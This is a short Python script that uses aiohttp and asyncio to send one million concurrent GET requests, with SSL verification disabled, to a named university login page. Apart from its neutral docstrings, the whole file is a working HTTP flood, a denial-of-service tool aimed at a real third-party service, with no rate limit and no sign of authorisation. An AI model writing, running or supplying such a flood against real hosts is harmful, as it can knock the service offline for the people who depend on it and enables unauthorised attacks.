import aiohttp
import asyncio
import time
from typing import Generator, List


# The URL to send GET requests to
url: str = 'https://food.mubabol.ac.ir/identity/login?signin=92cd0d0d682454d2d2e7d9f945774f37'

# The number of requests to send
num_requests: int = 1_000_000

def create_request_tasks(session: aiohttp.ClientSession) -> Generator[asyncio.Task, None, None]:
    """
    A generator function that yields tasks, with each task representing a GET request to the given URL using the provided session.

    Parameters:
    - session: aiohttp.ClientSession object

    Yields:
    - task: asyncio.Task object
    """
    for i in range(num_requests):
        # Create a GET request with the given URL and SSL disabled
        request = session.get(url, ssl=False)
        # Create a task to execute the request asynchronously and yield it
        yield asyncio.create_task(request)

async def send_requests() -> List[aiohttp.ClientResponse]:
    """
    Sends multiple GET requests to the given URL concurrently using aiohttp library and asyncio library.

    Returns:
    - responses: list of aiohttp.ClientResponse objects
    """
    async with aiohttp.ClientSession() as session:
        # Wait for all tasks to complete and return the responses as a list
        responses = await asyncio.gather(*create_request_tasks(session))
        return responses

# Set the event loop policy to the WindowsSelectorEventLoopPolicy on Windows platform to avoid a warning message
asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

start_time = time.time()

# Send the requests and get the responses
responses: List[aiohttp.ClientResponse] = asyncio.run(send_requests())

end_time = time.time()

# Print out the status code of each response received from the GET requests
for response in responses:
    print(response.status)

print(f"Total time taken: {end_time - start_time} seconds")